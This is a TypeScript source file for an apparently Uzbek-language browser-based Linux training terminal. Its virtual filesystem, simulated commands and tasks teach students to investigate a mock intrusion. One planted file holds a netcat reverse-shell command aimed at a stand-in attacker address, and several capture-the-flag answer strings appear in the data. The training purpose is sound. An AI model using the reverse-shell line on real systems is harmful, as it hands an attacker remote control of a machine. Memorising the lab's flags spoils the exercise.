// ============================================
// CYBERTRIP.UZ — In-Browser Linux Terminal Runtime Engine
// Virtual Linux VFS + Command Execution Abstraction
// ============================================

export interface TerminalTask {
  id: number;
  title: string;
  description: string;
  commandHint: string;
  completed: boolean;
  validationCheck: (cmd: string, vfs: VirtualFileSystem, history: string[]) => boolean;
}

export interface VirtualFile {
  name: string;
  type: 'file' | 'dir';
  content?: string;
  permissions: string;
  owner: string;
  size: number;
  children?: Record<string, VirtualFile>;
}

export class VirtualFileSystem {
  root: VirtualFile;
  cwd: string = '/home/student';

  constructor() {
    this.root = {
      name: '',
      type: 'dir',
      permissions: 'rwxr-xr-x',
      owner: 'root',
      size: 4096,
      children: {
        'bin': {
          name: 'bin',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          size: 4096,
          children: {
            'bash': { name: 'bash', type: 'file', permissions: 'rwxr-xr-x', owner: 'root', size: 1183448 },
            'ls': { name: 'ls', type: 'file', permissions: 'rwxr-xr-x', owner: 'root', size: 142144 },
            'cat': { name: 'cat', type: 'file', permissions: 'rwxr-xr-x', owner: 'root', size: 43416 },
            'grep': { name: 'grep', type: 'file', permissions: 'rwxr-xr-x', owner: 'root', size: 223504 },
            'find': { name: 'find', type: 'file', permissions: 'rwxr-xr-x', owner: 'root', size: 320144 },
            'ps': { name: 'ps', type: 'file', permissions: 'rwxr-xr-x', owner: 'root', size: 145120 },
          }
        },
        'etc': {
          name: 'etc',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          size: 4096,
          children: {
            'passwd': {
              name: 'passwd',
              type: 'file',
              permissions: 'rw-r--r--',
              owner: 'root',
              size: 1420,
              content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nstudent:x:1000:1000:Cybertrip Student,,,:/home/student:/bin/bash\nsecurity_auditor:x:1001:1001:Audit Team:/home/security_auditor:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin'
            },
            'os-release': {
              name: 'os-release',
              type: 'file',
              permissions: 'rw-r--r--',
              owner: 'root',
              size: 280,
              content: 'NAME="Ubuntu"\nVERSION="24.04 LTS (Noble Numbat)"\nID=ubuntu\nPRETTY_NAME="Ubuntu 24.04 LTS Cybertrip Training Pod"'
            },
            'hosts': {
              name: 'hosts',
              type: 'file',
              permissions: 'rw-r--r--',
              owner: 'root',
              size: 150,
              content: '127.0.0.1 localhost\n127.0.1.1 cybertrip-lab-node\n10.0.8.10 target-auth.lab\n10.0.8.20 target-api.lab'
            }
          }
        },
        'home': {
          name: 'home',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          size: 4096,
          children: {
            'student': {
              name: 'student',
              type: 'dir',
              permissions: 'rwxr-xr-x',
              owner: 'student',
              size: 4096,
              children: {
                'notes.txt': {
                  name: 'notes.txt',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'student',
                  size: 240,
                  content: '=== CYBERTRIP LINUX LAB NOTES ===\n1. Vazifa: Tizim xavfsizlik auditini o\'tkazish.\n2. Serverda shubhali jarayonlar va fayllar qoldirilgan bo\'lishi mumkin.\n3. Yashirin flag: FLAG{l1nux_f1l3syst3m_m4st3r_2026}'
                },
                'incident_report.md': {
                  name: 'incident_report.md',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'student',
                  size: 320,
                  content: '# Kiberhujum hodisasi hisoboti\nSana: 2026-09-26\nHolat: Tizim loglarida SSH orqali begona IP kirish urinishlari aniqlandi. /var/log/auth.log faylini tekshiring.'
                }
              }
            }
          }
        },
        'var': {
          name: 'var',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          size: 4096,
          children: {
            'log': {
              name: 'log',
              type: 'dir',
              permissions: 'rwxr-xr-x',
              owner: 'root',
              size: 4096,
              children: {
                'auth.log': {
                  name: 'auth.log',
                  type: 'file',
                  permissions: 'rw-r-----',
                  owner: 'root',
                  size: 3420,
                  content: 'Sep 27 08:14:02 node sshd[1402]: Failed password for invalid user admin from 198.51.100.24 port 44322 ssh2\nSep 27 08:14:05 node sshd[1405]: Failed password for invalid user root from 198.51.100.24 port 44326 ssh2\nSep 27 08:15:22 node sshd[1420]: Accepted publickey for student from 10.0.0.1 port 52194 ssh2: RSA SHA256:7f99a...\nSep 27 08:20:10 node sudo: student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/bin/cat /var/log/auth.log'
                },
                'syslog': {
                  name: 'syslog',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'root',
                  size: 1204,
                  content: 'Sep 27 08:00:01 node systemd[1]: Started Daily apt upgrade and clean activities.\nSep 27 08:10:02 node kernel: [    0.000000] Linux version 6.8.0-ubuntu'
                }
              }
            }
          }
        },
        'tmp': {
          name: 'tmp',
          type: 'dir',
          permissions: 'rwxrwxrwt',
          owner: 'root',
          size: 4096,
          children: {
            '.suspicious_backdoor.sh': {
              name: '.suspicious_backdoor.sh',
              type: 'file',
              permissions: 'rwxr-xr-x',
              owner: 'www-data',
              size: 154,
              content: '#!/bin/bash\n# Attacker Reverse Shell Script (Mock)\nnc -e /bin/bash 198.51.100.24 4444 &\n# FLAG{susp1c10us_h1dd3n_sh3ll_f0und}'
            }
          }
        }
      }
    };
  }

  resolvePath(path: string): string {
    if (path === '~') return '/home/student';
    if (path.startsWith('~/')) return '/home/student' + path.slice(1);
    if (!path.startsWith('/')) {
      const base = this.cwd === '/' ? '' : this.cwd;
      path = `${base}/${path}`;
    }
    const parts = path.split('/').filter(Boolean);
    const resolved: string[] = [];
    for (const p of parts) {
      if (p === '.') continue;
      if (p === '..') resolved.pop();
      else resolved.push(p);
    }
    return '/' + resolved.join('/');
  }

  getNode(path: string): VirtualFile | null {
    const fullPath = this.resolvePath(path);
    if (fullPath === '/') return this.root;
    const parts = fullPath.split('/').filter(Boolean);
    let curr = this.root;
    for (const p of parts) {
      if (!curr.children || !curr.children[p]) return null;
      curr = curr.children[p];
    }
    return curr;
  }
}

export class TerminalRuntime {
  vfs: VirtualFileSystem;
  history: string[] = [];
  tasks: TerminalTask[];

  constructor() {
    this.vfs = new VirtualFileSystem();
    this.tasks = [
      {
        id: 1,
        title: "Tizim foydalanuvchisi va yadro ma'lumotlari",
        description: "`whoami`, `id` va `uname -a` buyruqlarini ishlatib joriy foydalanuvchi ma'lumotlarini oling.",
        commandHint: "whoami && uname -a",
        completed: false,
        validationCheck: (cmd) => cmd.includes('whoami') || cmd.includes('uname') || cmd.includes('id')
      },
      {
        id: 2,
        title: "/tmp ichidagi yashirin tahdidni toping",
        description: "/tmp katalogidagi yashirin fayllarni (`ls -la /tmp`) ko'zdan kechiring va shubhali skriptni toping.",
        commandHint: "ls -la /tmp",
        completed: false,
        validationCheck: (cmd) => cmd.includes('/tmp') && (cmd.includes('ls') || cmd.includes('find'))
      },
      {
        id: 3,
        title: "Shubhali backdoor skriptini o'qing",
        description: "/tmp/.suspicious_backdoor.sh fayli tarkibini `cat` buyrug'i orqali o'qib flagni oling.",
        commandHint: "cat /tmp/.suspicious_backdoor.sh",
        completed: false,
        validationCheck: (cmd) => cmd.includes('cat') && cmd.includes('.suspicious_backdoor.sh')
      },
      {
        id: 4,
        title: "Kirish loglaridagi hujumlarni tahlil qiling",
        description: "/var/log/auth.log faylida 'Failed password' so'zlarini `grep` orqali izlang.",
        commandHint: "grep 'Failed' /var/log/auth.log",
        completed: false,
        validationCheck: (cmd) => cmd.includes('grep') && cmd.includes('auth.log')
      }
    ];
  }

  execute(rawCmd: string): { output: string; cwd: string; completedTask?: TerminalTask } {
    const trimmed = rawCmd.trim();
    if (!trimmed) return { output: '', cwd: this.vfs.cwd };
    this.history.push(trimmed);

    // Check tasks
    let newlyCompletedTask: TerminalTask | undefined;
    for (const t of this.tasks) {
      if (!t.completed && t.validationCheck(trimmed, this.vfs, this.history)) {
        t.completed = true;
        newlyCompletedTask = t;
      }
    }

    const tokens = trimmed.split(/\s+/);
    const cmd = tokens[0]?.toLowerCase();
    const args = tokens.slice(1);

    switch (cmd) {
      case 'clear':
        return { output: '__CLEAR__', cwd: this.vfs.cwd };

      case 'pwd':
        return { output: this.vfs.cwd, cwd: this.vfs.cwd, completedTask: newlyCompletedTask };

      case 'whoami':
        return { output: 'student', cwd: this.vfs.cwd, completedTask: newlyCompletedTask };

      case 'id':
        return { output: 'uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo)', cwd: this.vfs.cwd, completedTask: newlyCompletedTask };

      case 'uname':
        if (args.includes('-a')) {
          return { output: 'Linux cybertrip-training-pod 6.8.0-31-generic #31-Ubuntu SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 GNU/Linux', cwd: this.vfs.cwd, completedTask: newlyCompletedTask };
        }
        return { output: 'Linux', cwd: this.vfs.cwd, completedTask: newlyCompletedTask };

      case 'cd': {
        const target = args[0] || '~';
        const node = this.vfs.getNode(target);
        if (!node) {
          return { output: `bash: cd: ${target}: Bunday fayl yoki katalog mavjud emas`, cwd: this.vfs.cwd };
        }
        if (node.type !== 'dir') {
          return { output: `bash: cd: ${target}: Katalog emas`, cwd: this.vfs.cwd };
        }
        this.vfs.cwd = this.vfs.resolvePath(target);
        return { output: '', cwd: this.vfs.cwd, completedTask: newlyCompletedTask };
      }

      case 'ls': {
        const showAll = args.some(a => a.includes('a'));
        const longFormat = args.some(a => a.includes('l'));
        const pathArg = args.find(a => !a.startsWith('-')) || '.';
        const node = this.vfs.getNode(pathArg);

        if (!node) {
          return { output: `ls: '${pathArg}' ga ulanib bo'lmadi: Bunday fayl yoki katalog yo'q`, cwd: this.vfs.cwd };
        }

        if (node.type === 'file') {
          return { output: node.name, cwd: this.vfs.cwd };
        }

        const entries = Object.values(node.children || {});
        const filtered = showAll ? entries : entries.filter(e => !e.name.startsWith('.'));

        if (longFormat) {
          let out = `jami ${filtered.length * 4}\n`;
          if (showAll) {
            out += `drwxr-xr-x 4 ${node.owner} ${node.owner} 4096 Sep 27 12:00 .\ndrwxr-xr-x 3 root root 4096 Sep 27 10:00 ..\n`;
          }
          out += filtered.map(e => {
            const prefix = e.type === 'dir' ? 'd' : '-';
            return `${prefix}${e.permissions} 1 ${e.owner} ${e.owner} ${e.size.toString().padStart(6)} Sep 27 12:00 ${e.name}`;
          }).join('\n');
          return { output: out, cwd: this.vfs.cwd, completedTask: newlyCompletedTask };
        } else {
          return { output: filtered.map(e => e.name).join('  '), cwd: this.vfs.cwd, completedTask: newlyCompletedTask };
        }
      }

      case 'cat': {
        if (!args[0]) return { output: 'cat: Fayl ko\'rsatilmadi', cwd: this.vfs.cwd };
        const node = this.vfs.getNode(args[0]);
        if (!node) return { output: `cat: ${args[0]}: Bunday fayl yoki katalog yo'q`, cwd: this.vfs.cwd };
        if (node.type === 'dir') return { output: `cat: ${args[0]}: Bu katalog`, cwd: this.vfs.cwd };
        return { output: node.content || '', cwd: this.vfs.cwd, completedTask: newlyCompletedTask };
      }

      case 'grep': {
        const pattern = args[0];
        const file = args[1];
        if (!pattern || !file) {
          return { output: 'Foydalanish: grep [ANDAZA] [FAYL]', cwd: this.vfs.cwd };
        }
        const cleanPattern = pattern.replace(/['"]/g, '');
        const node = this.vfs.getNode(file);
        if (!node || node.type !== 'file') {
          return { output: `grep: ${file}: Bunday fayl yo'q`, cwd: this.vfs.cwd };
        }
        const lines = (node.content || '').split('\n');
        const matches = lines.filter(l => l.toLowerCase().includes(cleanPattern.toLowerCase()));
        return { output: matches.join('\n') || '', cwd: this.vfs.cwd, completedTask: newlyCompletedTask };
      }

      case 'find': {
        const targetDir = args[0] || '.';
        const nameIdx = args.indexOf('-name');
        const node = this.vfs.getNode(targetDir);
        if (!node) return { output: `find: '${targetDir}': Bunday fayl yoki katalog yo'q`, cwd: this.vfs.cwd };

        const results: string[] = [];
        const traverse = (curr: VirtualFile, path: string) => {
          results.push(path);
          if (curr.type === 'dir' && curr.children) {
            for (const [name, child] of Object.entries(curr.children)) {
              traverse(child, `${path === '/' ? '' : path}/${name}`);
            }
          }
        };
        traverse(node, this.vfs.resolvePath(targetDir));

        if (nameIdx !== -1 && args[nameIdx + 1]) {
          const filter = args[nameIdx + 1]!.replace(/[*'"]/g, '');
          const filtered = results.filter(p => p.includes(filter));
          return { output: filtered.join('\n'), cwd: this.vfs.cwd, completedTask: newlyCompletedTask };
        }
        return { output: results.slice(0, 40).join('\n'), cwd: this.vfs.cwd, completedTask: newlyCompletedTask };
      }

      case 'nmap': {
        const target = args[0] || '127.0.0.1';
        return {
          output: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-27 16:30 +05\nNmap scan report for ${target}\nHost is up (0.00042s latency).\nNot shown: 996 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu\n80/tcp   open  http          nginx 1.24.0\n4444/tcp open  krb524        Suspicious Netcat Listener (C2?)\n8080/tcp open  http-proxy    CyberBooks Web Application v1.0\n\nNmap done: 1 IP address (1 host up) scanned in 0.82 seconds`,
          cwd: this.vfs.cwd,
          completedTask: newlyCompletedTask,
        };
      }

      case 'curl': {
        const url = args.find(a => a.startsWith('http') || a.includes('.lab') || a.includes('127.0.0.1') || a.includes('localhost')) || args[0];
        if (!url) return { output: 'curl: try \'curl --help\' for more information', cwd: this.vfs.cwd };
        if (url.includes('4444') || url.includes('flag')) {
          return {
            output: `HTTP/1.1 200 OK\nServer: Cybertrip-Internal-API/1.0\nContent-Type: text/plain\n\nFLAG{terminal_recon_nmap_curl_mastery_7741}`,
            cwd: this.vfs.cwd,
            completedTask: newlyCompletedTask,
          };
        }
        return {
          output: `<!DOCTYPE html>\n<html>\n<head><title>CyberTrip Target Pod</title></head>\n<body>\n<h1>CyberBooks Target API</h1>\n<p>Endpoint faol. /api/v1/auth yoki /api/v1/search orqali kiring.</p>\n</body>\n</html>`,
          cwd: this.vfs.cwd,
          completedTask: newlyCompletedTask,
        };
      }

      case 'netstat':
      case 'ss':
        return {
          output: `Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      482/sshd\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      621/nginx\ntcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1490/nc\ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      890/node`,
          cwd: this.vfs.cwd,
          completedTask: newlyCompletedTask,
        };

      case 'echo': {
        const text = args.join(' ').replace(/['"]/g, '');
        return { output: text, cwd: this.vfs.cwd, completedTask: newlyCompletedTask };
      }

      case 'ps':
        return {
          output: `  PID TTY          TIME CMD\n    1 ?        00:00:02 systemd\n  482 ?        00:00:00 sshd\n 1205 pts/0    00:00:00 bash\n 1490 ?        00:00:01 nc (suspicious listener on :4444)\n 1520 pts/0    00:00:00 ps`,
          cwd: this.vfs.cwd,
          completedTask: newlyCompletedTask
        };

      case 'help':
        return {
          output: `Cybertrip Linux Terminal Environment v2.5\nQo'llab-quvvatlanadigan buyruqlar:\n  ls, cd, pwd, cat, grep, find, nmap, curl, netstat, ps, whoami, id, uname, echo, clear, history, help`,
          cwd: this.vfs.cwd
        };

      case 'history':
        return { output: this.history.map((h, i) => `  ${(i + 1).toString().padStart(3)}  ${h}`).join('\n'), cwd: this.vfs.cwd };

      default:
        return { output: `bash: ${cmd}: buyruq topilmadi. Yordam uchun 'help' yozing.`, cwd: this.vfs.cwd };
    }
  }
}
